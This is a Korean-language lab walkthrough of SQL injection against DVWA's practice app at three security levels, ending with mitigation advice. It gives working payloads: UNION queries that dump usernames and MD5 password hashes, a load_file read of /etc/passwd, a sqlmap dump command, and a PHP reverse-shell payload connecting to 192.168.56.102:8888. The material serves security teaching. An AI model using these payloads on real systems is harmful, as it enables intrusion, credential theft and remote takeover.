
DVWA v1.0.7

# SQL Injection

## Security Level : low

### 풀이

![image](https://github.com/user-attachments/assets/eea201ad-8b97-4857-ac38-85a5fbdbda2e)

유저 ID를 검색하는 화면이 나옴

![image](https://github.com/user-attachments/assets/30861f99-1bf2-4228-ae85-2f20fd3f8c2d)

1을 입력하면 admin 나옴. User ID 에 해당하는 번호를 입력하면 그에 대응하는 user가 출력됨을 알 수 있음.

![image](https://github.com/user-attachments/assets/6f500fc8-aea5-498f-85d0-d923653d366f)

"'or 1=1 #" 로 SQL Injeciton 공격을 실행하니 모든 유저의 정보가 나타남.

![image](https://github.com/user-attachments/assets/c1f32cb7-28d5-4f4b-842e-a593981af107)

'union select 1,2 from information_schema.tables # 로 현재 출력하고 있는 열의 개수는 2개임을 알게 됨.

![image](https://github.com/user-attachments/assets/b2cddd43-dd29-4771-ae1b-4cc7fd97e46b)

'UNION SELECT table_name, NULL FROM information_schema.tables # 를 통해 users 라는 테이블명을 알게 됨.

![image](https://github.com/user-attachments/assets/9ba8245f-bf79-42bd-8414-7669f1faadc1)

'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' # 를 통해 users 테이블에는 user_id, first_name, last_name, user, password, avatar 라는 열이 있음을 알게 됨.

![image](https://github.com/user-attachments/assets/8938bb15-8d90-4961-8f0c-940e6ef7f1ef)

'union select user, password from users # 를 통해 user 와 password 값을 알아냄. password는 암호화되어 있음.

![image](https://github.com/user-attachments/assets/1398434e-f753-4472-b3cd-1d1d8150c5ac)

admin의 암호화된 비밀번호가 어떤 방식으로 암호화되어 있는지 확인해보니 md5가 가장 가능성이 높음.

![image](https://github.com/user-attachments/assets/835e5a19-b125-4346-9e75-f8dc086bb15d)

md5로 decode해보니 password라는 값이 나옴. 따라서 admin의 비밀번호는 password라는 것을 알 수 있음.

![image](https://github.com/user-attachments/assets/2f1e8220-c57d-427f-92d9-4154d56e16ef)

1' union select null, load_file('/etc/passwd') # 로 /etc/password 를 불러 올 수 있음.

![image](https://github.com/user-attachments/assets/b4316c6f-7fa2-4fa0-8d4a-b2fbcbe377a2)

`' union select '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.56.102/8888 0>&1\'"); ?>', null into outfile '/tmp/shell.php'#`

로 /tmp 경로에 shell.php 파일을 생성한 후, file inclusion 에서 사용한 취약점을 이용하여 /tmp/shell.php 를 실행하여 리버스쉘 시도

![image](https://github.com/user-attachments/assets/71e53c43-9b86-43ca-a927-5c64ce3ff534)

sqlmap -u "http://192.168.56.110/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=b7h1cscpu6mtaogtllp8r1ccv1; security=low" --dump

SQL Injection 취약점을 이용하여 dvwa 데이터베이스 내 users 테이블에 접근

사용자 계정 정보 및 암호화된 비밀번호와 평문으로 크랙된 비밀번호 확인

### 페이지 소스

<img src=https://github.com/user-attachments/assets/a3d6564a-6a5f-4211-af1e-b54b081b3e40 width=600>

$id = $_GET['id'];

$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";   → 해당 코드는 id로 전달된 사용자 입력값을 별도의 필터링이나 검증 없이 직접 SQL 쿼리문에 삽입

## Security Level : medium

### 풀이

![image](https://github.com/user-attachments/assets/afed916d-53b8-4b99-b063-454a254a3ddd)

' or 1=1 # 를 입력하니 위와 같은 오류 메시지가 나타남. 오류 메시지를 읽어보면 '(싱글 쿼트) 앞에 \(백슬래시)가 생긴 것으로 보아 ysql_real_escape_string() 함수를 사용했음을 추측 가능

![image](https://github.com/user-attachments/assets/0612163f-65c5-4be4-8030-c1f541183344)

'(싱글 쿼트)와 같은 특수 문자를 사용하지 않고 1 or 1=1 를 입력했더니 모든 유저 정보가 나타남

![image](https://github.com/user-attachments/assets/629a9c4b-077e-4585-b88d-dc7928c615c1)

마찬가지로, '(싱글 쿼트) 없이 1 union select user,password from users 를 입력했더니 유저명과 비밀번호 정보가 나타남.

### 페이지 소스

<img src=https://github.com/user-attachments/assets/fa9931af-64d1-41d0-8de1-9241a648ff04 width=600>

$id = mysql_real_escape_string($id);   → 특수문자 앞에 \(백슬래시) 추가

mysql_real_escape_string() 함수로 백슬래시를 붙여 '(싱글 쿼트)를 사용하는 SQL Injection 공격에 대해서는 대응할 수 있지만 사용하지 않는 공격은 대응하지 못함.

## Security Level : high

### 풀이

![image](https://github.com/user-attachments/assets/f2b8f629-dc0b-43e1-bcaf-59ba5bdfa2eb)

1 or 1=1를 입력하여 Security Level: medium 과 동일한 시도를 했으나, 페이지에 표시되는 오류 메시지나 동작상의 변화 없음

### 페이지 소스

<img src=https://github.com/user-attachments/assets/8a4ff30b-4201-4df4-9f36-e4bece30f59c width=600>

$id = stripslashes($id);   → php의 magic_quotes_gpc 기능 등으로 생긴 \(백슬래시)를 지움

if (is_numeric($id)){    → id 입력값이 숫자인 경우만 처리

입력값이 숫자형으로 제한되어 있기 때문에 select, or, insert, update 등 SQL 구문에 사용되는 명령어들을 포함한 문자열 입력이 필터링

일반적인 SQL Injection 공격이 적용되기 어렵고, 취약점을 활용하기 위한 추가적인 우회 기법이 필요

## 대응 방안

is_numeric와 같이 SQL 쿼리에 사용되는 문자열의 유효성을 검증하는 로직 구현

'(싱글 쿼트), ;(세미클론), --(더블 대시), #(해시), /* */(슬래시 에스터리스크)와 같은 특수문자를 사용자 입력 값으로 지정 금지

Dynamic SQL 구문(ex. $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";) 사용을 지양하며 preg_match() 함수와 같은 파라미터에 문자열 검사 필수적용

시스템에서 제공하는 에러 메시지 및 DBMS에서 제공하는 에러 코드가 노출되지 않도록 예외처리

웹 방화벽(WAF)에 인젝션 공격 관련 룰 설정


## SQL Injection(Blind)

$num = @mysql_numrows($result);    → 오류 메시지를 숨김
